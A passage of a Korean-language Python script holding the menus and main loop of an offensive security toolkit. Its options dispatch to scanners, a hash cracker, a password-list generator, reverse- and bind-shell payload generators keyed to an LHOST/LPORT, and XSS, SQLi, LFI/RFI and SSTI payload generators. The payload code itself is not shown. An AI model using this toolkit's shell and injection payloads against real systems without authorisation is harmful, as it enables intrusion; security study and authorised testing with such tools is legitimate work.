    print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}")

def display_payload_menu():
    print_banner()
    print(f"{Colors.YELLOW}{Colors.BOLD}멀티 언어 공격 모듈 및 페이로드 생성기:{Colors.RESET}")
    print(f"{Colors.GREEN}  6.1. Reverse Shell 페이로드 생성{Colors.RESET}")
    print(f"{Colors.GREEN}  6.2. Bind Shell 페이로드 생성{Colors.RESET}")
    print(f"{Colors.GREEN}  6.3. Meterpreter 연동 가이드라인{Colors.RESET}")
    print(f"{Colors.GREEN}  6.4. Termux 환경 제약사항 안내{Colors.RESET}")
    print(f"{Colors.BLUE}  B. 뒤로 가기{Colors.RESET}")
    print(f"{Colors.RED}  0. 종료{Colors.RESET}")
    print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}")

def display_multi_language_payload_library_menu():
    print_banner()
    print(f"{Colors.YELLOW}{Colors.BOLD}멀티 언어 페이로드 라이브러리 (Filter by Language):{Colors.RESET}")
    print(f"{Colors.GREEN}  L.1. Shell / Bash 페이로드{Colors.RESET}")
    print(f"{Colors.GREEN}  L.2. Python 페이로드{Colors.RESET}")
    print(f"{Colors.GREEN}  L.3. JavaScript / Node.js 페이로드{Colors.RESET}")
    print(f"{Colors.GREEN}  L.4. C / C++ 페이로드{Colors.RESET}")
    print(f"{Colors.GREEN}  L.5. Java 페이로드{Colors.RESET}")
    print(f"{Colors.GREEN}  L.6. Go 페이로드{Colors.RESET}")
    print(f"{Colors.GREEN}  L.7. PHP 페이로드{Colors.RESET}")
    print(f"{Colors.GREEN}  L.8. Ruby 페이로드{Colors.RESET}")
    print(f"{Colors.GREEN}  L.9. Perl 페이로드{Colors.RESET}")
    print(f"{Colors.GREEN}  L.10. C# 페이로드{Colors.RESET}")
    print(f"{Colors.GREEN}  L.11. Bind Shell 페이로드 (언어 무관){Colors.RESET}")
    print(f"{Colors.GREEN}  L.12. Meterpreter 연동 가이드라인{Colors.RESET}")
    print(f"{Colors.GREEN}  L.13. Termux 환경 제약사항 안내{Colors.RESET}")
    print(f"{Colors.BLUE}  B. 뒤로 가기{Colors.RESET}")
    print(f"{Colors.RED}  0. 종료{Colors.RESET}")
    print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}")

def display_web_hacking_tools_menu():
    print_banner()
    print(f"{Colors.YELLOW}{Colors.BOLD}웹 해킹 및 취약점 우회 도구:{Colors.RESET}")
    print(f"{Colors.GREEN}  W.1. XSS (Cross-Site Scripting) 페이로드{Colors.RESET}")
    print(f"{Colors.GREEN}  W.2. SQL Injection 페이로드{Colors.RESET}")
    print(f"{Colors.GREEN}  W.3. LFI / RFI (Local/Remote File Inclusion) 페이로드{Colors.RESET}")
    print(f"{Colors.GREEN}  W.4. SSTI (Server Side Template Injection) 페이로드{Colors.RESET}")
    print(f"{Colors.BLUE}  B. 뒤로 가기{Colors.RESET}")
    print(f"{Colors.RED}  0. 종료{Colors.RESET}")
    print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}")

def show_help():
    clear_screen()
    print_banner()
    print(f"{Colors.YELLOW}{Colors.BOLD}도움말:{Colors.RESET}\n")
    print(f"{Colors.WHITE}이 도구는 도메인 또는 IP 주소에 대한 광범위한 공개 정보를 수집하고 보안 분석을 수행합니다.\n")
    print(f"{Colors.WHITE}메인 메뉴에서 원하는 기능 카테고리를 선택한 후, 세부 메뉴에서 특정 도구를 실행할 수 있습니다.\n")
    print(f"{Colors.WHITE}  - 종합 스캔: 모든 주요 정보를 수집하고 HTML 보고서를 생성합니다.\n")
    print(f"{Colors.WHITE}  - 정보 수집 도구: WHOIS, DNS, IP 위치, 서브도메인, 이메일, SSL, 역방향 IP, Google Dork 등을 조회합니다.\n")
    print(f"{Colors.WHITE}  - 웹 분석 도구: 웹 기술 스택, WAF, 보안 헤더, Clickjacking, Open Redirect, CORS, Robots.txt, Sitemap 뿐만 아니라 XSS/SQLi 스캐너, CMS 취약점, Exploit-DB 연동 등을 분석합니다.\n")
    print(f"{Colors.WHITE}  - 네트워크 보안 도구: 포트 스캔, 정밀 서비스 버전 감지, FTP 익명 로그인, Traceroute, Ping Sweep, 네트워크 지연 시간 등을 확인합니다.\n")
    print(f"{Colors.WHITE}  - 암호학 & 유틸리티: 해시 생성/식별/크래킹, 인코딩/디코딩, 패스워드 생성, IP 계산기, Epoch 변환 등을 제공합니다.\n")
    print(f"{Colors.WHITE}  - 멀티 언어 페이로드 라이브러리: 다양한 언어의 리버스 쉘/바인드 쉘 페이로드, 웹 취약점 우회 페이로드 등을 생성하고 Termux 환경에서의 제약사항을 안내합니다.\n")
    print(f"{Colors.WHITE}  - 'B' 또는 'b'를 입력하여 이전 메뉴로 돌아갈 수 있습니다.\n")
    print(f"{Colors.WHITE}  - '0'을 입력하여 도구를 종료할 수 있습니다.\n")
    print(f"{Colors.RED}주의: 이 도구는 교육 및 보안 학습 목적으로 제작되었습니다. 타인의 동의 없이 무단으로 정보를 수집하거나 악용하는 행위는 법적 문제를 야기할 수 있습니다. 항상 윤리적이고 합법적인 범위 내에서 사용하십시오.{Colors.RESET}\n")
    input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")

def main():
    while True:
        print_banner()
        print(f"{Colors.YELLOW}{Colors.BOLD}메인 메뉴 (V3.0 Advanced):{Colors.RESET}")
        print(f"{Colors.GREEN}  1. 종합 OSINT & 보안 스캔 (HTML 보고서 생성){Colors.RESET}")
        print(f"{Colors.GREEN}  2. 정보 수집 도구{Colors.RESET}")
        print(f"{Colors.GREEN}  3. 웹 분석 및 고도화 취약점 스캔 도구{Colors.RESET}")
        print(f"{Colors.GREEN}  4. 네트워크 및 시스템 분석 도구{Colors.RESET}")
        print(f"{Colors.GREEN}  5. 암호학 & 유틸리티{Colors.RESET}")
        print(f"{Colors.GREEN}  6. 멀티 언어 페이로드 라이브러리{Colors.RESET}")
        print(f"{Colors.GREEN}  7. 웹 해킹 및 취약점 우회 도구{Colors.RESET}")
        print(f"{Colors.GREEN}  8. 도움말{Colors.RESET}")
        print(f"{Colors.RED}  0. 종료{Colors.RESET}")
        print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}")
        
        choice = input(f"{Colors.YELLOW}선택하세요: {Colors.RESET}").strip()

        if choice == '1':
            target = input(f"{Colors.CYAN}종합 스캔할 도메인 또는 IP 주소를 입력하세요: {Colors.RESET}").strip()
            if target:
                run_full_scan(target)
            else:
                print(f"{Colors.RED}유효한 대상을 입력해주세요.{Colors.RESET}")
            input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
        
        elif choice == '2': # 정보 수집 도구
            while True:
                display_info_gathering_menu()
                sub_choice = input(f"{Colors.YELLOW}선택하세요 (0-8, B): {Colors.RESET}").strip().upper()
                if sub_choice == 'B': break
                if sub_choice == '0': sys.exit(0)

                target = input(f"{Colors.CYAN}대상 도메인 또는 IP 주소를 입력하세요: {Colors.RESET}").strip()
                if not target: print(f"{Colors.RED}유효한 대상을 입력해주세요.{Colors.RESET}"); continue

                if sub_choice == '2.1': run_individual_scan("WHOIS", target)
                elif sub_choice == '2.2': run_individual_scan("DNS", target)
                elif sub_choice == '2.3': run_individual_scan("Geolocation", target)
                elif sub_choice == '2.4': run_individual_scan("Subdomain", target)
                elif sub_choice == '2.5': run_individual_scan("Email Harvester", target)
                elif sub_choice == '2.6': run_individual_scan("SSL Info", target)
                elif sub_choice == '2.7': run_individual_scan("Reverse IP", target)
                elif sub_choice == '2.8': run_individual_scan("Google Dorks", target)
                else: print(f"{Colors.RED}잘못된 선택입니다. 다시 시도해주세요.{Colors.RESET}")
                input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")

        elif choice == '3': # 웹 분석 및 취약점 스캔
            while True:
                display_web_analysis_menu()
                sub_choice = input(f"{Colors.YELLOW}선택하세요 (0-12, B): {Colors.RESET}").strip().upper()
                if sub_choice == 'B': break
                if sub_choice == '0': sys.exit(0)

                if sub_choice == '3.12':
                    keyword = input(f"{Colors.CYAN}검색할 취약점 키워드 (예: WordPress, Apache): {Colors.RESET}").strip()
                    if keyword:
                        print_result("Exploit-DB 검색 결과", exploit_db_search(keyword))
                    else:
                        print(f"{Colors.RED}키워드를 입력해주세요.{Colors.RESET}")
                    input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
                    continue

                target = input(f"{Colors.CYAN}대상 도메인 또는 URL을 입력하세요: {Colors.RESET}").strip()
                if not target: print(f"{Colors.RED}유효한 대상을 입력해주세요.{Colors.RESET}"); continue

                if sub_choice == '3.1': run_individual_scan("Web Tech", target)
                elif sub_choice == '3.2': run_individual_scan("WAF", target)
                elif sub_choice == '3.3': run_individual_scan("Security Headers", target)
                elif sub_choice == '3.4': run_individual_scan("Clickjacking", target)
                elif sub_choice == '3.5': run_individual_scan("Open Redirect", target)
                elif sub_choice == '3.6': run_individual_scan("CORS", target)
                elif sub_choice == '3.7': run_individual_scan("Robots.txt", target)
                elif sub_choice == '3.8': run_individual_scan("Sitemap", target)
                elif sub_choice == '3.9': run_individual_scan("XSS/SQLi Scan", target)
                elif sub_choice == '3.10':
                    custom_path = input(f"{Colors.CYAN}사용자 정의 워드리스트 파일 경로 (기본 엔터 시 기본값 사용): {Colors.RESET}").strip()
                    print_result("디렉토리 브루트포싱 결과", dir_bruteforcer(target, custom_path if custom_path else None))
                elif sub_choice == '3.11': run_individual_scan("CMS Scan", target)
                else: print(f"{Colors.RED}잘못된 선택입니다. 다시 시도해주세요.{Colors.RESET}")
                input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")

        elif choice == '4': # 네트워크 및 시스템 분석
            while True:
                display_network_security_menu()
                sub_choice = input(f"{Colors.YELLOW}선택하세요 (0-6, B): {Colors.RESET}").strip().upper()
                if sub_choice == 'B': break
                if sub_choice == '0': sys.exit(0)

                target = input(f"{Colors.CYAN}대상 도메인 또는 IP 주소를 입력하세요: {Colors.RESET}").strip()
                if not target: print(f"{Colors.RED}유효한 대상을 입력해주세요.{Colors.RESET}"); continue

                if sub_choice == '4.1': run_individual_scan("Port Scan", target)
                elif sub_choice == '4.2': run_individual_scan("Service Version", target)
                elif sub_choice == '4.3': run_individual_scan("FTP Anon Login", target)
                elif sub_choice == '4.4': run_individual_scan("Traceroute", target)
                elif sub_choice == '4.5': run_individual_scan("Ping Sweep", target)
                elif sub_choice == '4.6': run_individual_scan("Latency Check", target)
                else: print(f"{Colors.RED}잘못된 선택입니다. 다시 시도해주세요.{Colors.RESET}")
                input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")

        elif choice == '5': # 암호학 & 유틸리티
            while True:
                display_crypto_utilities_menu()
                sub_choice = input(f"{Colors.YELLOW}선택하세요 (0-9, B): {Colors.RESET}").strip().upper()
                if sub_choice == 'B': break
                if sub_choice == '0': sys.exit(0)

                if sub_choice == '5.1':
                    text = input(f"{Colors.CYAN}해시를 생성할 텍스트를 입력하세요: {Colors.RESET}").strip()
                    print_result("해시 생성 결과", hash_generator(text))
                elif sub_choice == '5.2':
                    hash_val = input(f"{Colors.CYAN}식별할 해시 값을 입력하세요: {Colors.RESET}").strip()
                    print_result("해시 식별 결과", hash_identifier(hash_val))
                elif sub_choice == '5.3':
                    mode = input(f"{Colors.CYAN}인코딩(encode) 또는 디코딩(decode)을 선택하세요: {Colors.RESET}").strip().lower()
                    text = input(f"{Colors.CYAN}텍스트를 입력하세요: {Colors.RESET}").strip()
                    print_result(f"Base64 {mode.capitalize()} 결과", base64_encode_decode(text, mode))
                elif sub_choice == '5.4':
                    mode = input(f"{Colors.CYAN}인코딩(encode) 또는 디코딩(decode)을 선택하세요: {Colors.RESET}").strip().lower()
                    text = input(f"{Colors.CYAN}텍스트를 입력하세요: {Colors.RESET}").strip()
                    print_result(f"URL {mode.capitalize()} 결과", url_encode_decode(text, mode))
                elif sub_choice == '5.5':
                    try:
                        length = int(input(f"{Colors.CYAN}생성할 패스워드 길이 (기본 12): {Colors.RESET}") or 12)
                        include_symbols = input(f"{Colors.CYAN}특수 문자 포함 (y/n, 기본 y): {Colors.RESET}").strip().lower() != 'n'
                        print_result("생성된 패스워드", password_generator(length, include_symbols))
                    except ValueError: print(f"{Colors.RED}유효한 숫자를 입력해주세요.{Colors.RESET}")
                elif sub_choice == '5.6':
                    ip_cidr = input(f"{Colors.CYAN}IP 주소/CIDR (예: 192.168.1.0/24): {Colors.RESET}").strip()
                    print_result("IP 계산 결과", ip_calculator(ip_cidr))
                elif sub_choice == '5.7':
                    mode = input(f"{Colors.CYAN}Epoch -> 날짜(to_date) 또는 날짜 -> Epoch(to_epoch)를 선택하세요: {Colors.RESET}").strip().lower()
                    if mode == 'to_date':
                        timestamp = input(f"{Colors.CYAN}Epoch 타임스탬프를 입력하세요: {Colors.RESET}").strip()
                        print_result("변환 결과", epoch_converter(timestamp, mode))
                    elif mode == 'to_epoch':
                        date_str = input(f"{Colors.CYAN}날짜 및 시간 (YYYY-MM-DD HH:MM:SS): {Colors.RESET}").strip()
                        print_result("변환 결과", epoch_converter(date_str, mode))
                    else: print(f"{Colors.RED}잘못된 모드입니다.{Colors.RESET}")
                elif sub_choice == '5.8':
                    target_hash = input(f"{Colors.CYAN}크래킹할 해시 값을 입력하세요 (MD5, SHA1, SHA256): {Colors.RESET}").strip()
                    custom_wordlist = input(f"{Colors.CYAN}사용자 정의 워드리스트 경로 (기본 엔터 시 기본값 사용): {Colors.RESET}").strip()
                    print_result("해시 크래킹 결과", hash_cracker(target_hash, custom_wordlist if custom_wordlist else None))
                elif sub_choice == '5.9':
                    keywords_input = input(f"{Colors.CYAN}조합에 사용할 키워드를 입력하세요 (쉼표 구분, 예: admin,test,2026): {Colors.RESET}").strip()
                    keywords = [k.strip() for k in keywords_input.split(",") if k.strip()]
                    if keywords:
                        output_file = input(f"{Colors.CYAN}출력 파일명 (기본: wordlist.txt): {Colors.RESET}").strip() or "wordlist.txt"
                        print_result("패스워드 리스트 생성 결과", password_list_generator(keywords, output_file=output_file))
                    else:
                        print(f"{Colors.RED}키워드를 하나 이상 입력해주세요.{Colors.RESET}")
                else: print(f"{Colors.RED}잘못된 선택입니다. 다시 시도해주세요.{Colors.RESET}")
                input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")

        elif choice == '6': # 멀티 언어 페이로드 라이브러리
            while True:
                display_multi_language_payload_library_menu()
                sub = input(f"{Colors.YELLOW}언어 선택 (L.1-L.13, B): {Colors.RESET}").strip().upper()
                if sub == 'B': break
                if sub == '0': sys.exit(0)
                
                lhost = input(f"{Colors.CYAN}LHOST (내 IP): {Colors.RESET}").strip() or "127.0.0.1"
                lport = input(f"{Colors.CYAN}LPORT (포트): {Colors.RESET}").strip() or "4444"
                
                if sub == 'L.1': print_result("Shell Payloads", PayloadLibrary.get_shell_payloads(lhost, lport), Colors.GREEN)
                elif sub == 'L.2': print_result("Python Payloads", PayloadLibrary.get_python_payloads(lhost, lport), Colors.GREEN)
                elif sub == 'L.3': print_result("JavaScript Payloads", PayloadLibrary.get_javascript_payloads(lhost, lport), Colors.GREEN)
                elif sub == 'L.4': print_result("C Payloads", PayloadLibrary.get_c_payloads(lhost, lport), Colors.GREEN)
                elif sub == 'L.5': print_result("Java Payloads", PayloadLibrary.get_java_payloads(lhost, lport), Colors.GREEN)
                elif sub == 'L.6': print_result("Go Payloads", PayloadLibrary.get_go_payloads(lhost, lport), Colors.GREEN)
                elif sub == 'L.7': print_result("PHP Payloads", PayloadLibrary.get_php_payloads(lhost, lport), Colors.GREEN)
                elif sub == 'L.8': print_result("Ruby Payloads", PayloadLibrary.get_ruby_payloads(lhost, lport), Colors.GREEN)
                elif sub == 'L.9': print_result("Perl Payloads", PayloadLibrary.get_perl_payloads(lhost, lport), Colors.GREEN)
                elif sub == 'L.10': print_result("C# Payloads", PayloadLibrary.get_csharp_payloads(lhost, lport), Colors.GREEN)
                elif sub == 'L.11': print_result("Bind Shell Payloads", PayloadLibrary.get_bind_shell_payloads(lport), Colors.GREEN)
                elif sub == 'L.12': print(PayloadLibrary.get_meterpreter_guideline(lhost, lport))
                elif sub == 'L.13': print(PayloadLibrary.show_termux_constraints())
                else: print(f"{Colors.RED}잘못된 선택입니다. 다시 시도해주세요.{Colors.RESET}")
                input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")

        elif choice == '7': # 웹 해킹 및 취약점 우회 도구
            while True:
                display_web_hacking_tools_menu()
                sub = input(f"{Colors.YELLOW}선택 (W.1-W.4, B): {Colors.RESET}").strip().upper()
                if sub == 'B': break
                if sub == '0': sys.exit(0)

                if sub == 'W.1': print_result("XSS Payloads", xss_payload_generator(), Colors.RED)
                elif sub == 'W.2': print_result("SQLi Payloads", sqli_payload_generator(), Colors.RED)
                elif sub == 'W.3': print_result("LFI/RFI Payloads", lfi_rfi_payload_generator(), Colors.RED)
                elif sub == 'W.4': print_result("SSTI Payloads", ssti_payload_generator(), Colors.RED)
                else: print(f"{Colors.RED}잘못된 선택입니다. 다시 시도해주세요.{Colors.RESET}")
                input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")

        elif choice == '8':
            show_help()
        elif choice == '0':
            print(f"{Colors.RED}도구를 종료합니다. 안녕히 계세요!{Colors.RESET}")
            sys.exit(0)
        else:
            print(f"{Colors.RED}잘못된 선택입니다. 다시 시도해주세요.{Colors.RESET}")
            input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")

if __name__ == "__main__":
    main()

